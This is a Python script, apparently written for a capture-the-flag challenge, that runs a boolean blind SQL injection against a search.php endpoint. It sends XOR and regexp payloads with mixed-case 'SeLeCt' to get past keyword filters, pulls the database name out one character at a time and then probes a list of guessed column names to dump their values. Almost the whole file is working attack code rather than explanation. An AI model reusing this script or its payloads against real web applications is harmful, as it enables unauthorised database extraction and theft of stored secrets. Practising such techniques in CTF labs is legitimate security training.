#!/usr/bin/env python3
import requests
import time
import string

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """True = 条件为真(ERROR), False = 条件为假(Clever)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" in r.text or "Error" in r.text
    except:
        return False

def blind_regexp(query, name=""):
    """使用 regexp 盲注提取数据"""
    result = ""
    charset = string.ascii_lowercase + string.digits + "_-{}" + string.ascii_uppercase + "!@#$%^&*()+=[]{}|;:',.<>?/~`"
    
    for pos in range(1, 100):
        found = False
        for c in charset:
            pattern = f"^{result}{c}"
            payload = f"6^(({query})regexp'{pattern}')"
            if check(payload):
                result += c
                print(f"    {name}: {result}")
                found = True
                break
        if not found:
            break
    return result

# 获取数据库名
print("[*] Getting database name...")
db = blind_regexp("database()", "Database")

# 尝试获取表名
# 由于 from 被过滤，需要找其他方法
# 尝试使用子查询

print("\n[*] Trying to get table names...")
# 测试 SeLeCt(table_name) 是否可用
# 但需要 from 子句

# 尝试直接获取 flag
# 假设表名是 fl4g，列名是 flag
print("\n[*] Trying to get flag from fl4g table...")
# 但需要绕过 from

# 尝试用其他方式
# 使用 id=6 对应的记录
print("\n[*] Trying to get data from id=6...")

# 测试 id=6 对应的列
# 尝试获取所有列名
print("\n[*] Testing column names...")
columns = ["id", "flag", "fl4g", "password", "username", "user", "pass", "name", "value", "data", "content", "text", "secret"]
for col in columns:
    payload = f"6^(SeLeCt({col})regexp'^')"
    if check(payload):
        print(f"    Column '{col}' exists!")
        # 获取该列的值
        value = blind_regexp(f"SeLeCt({col})", f"Column '{col}'")
        print(f"    Value: {value}")

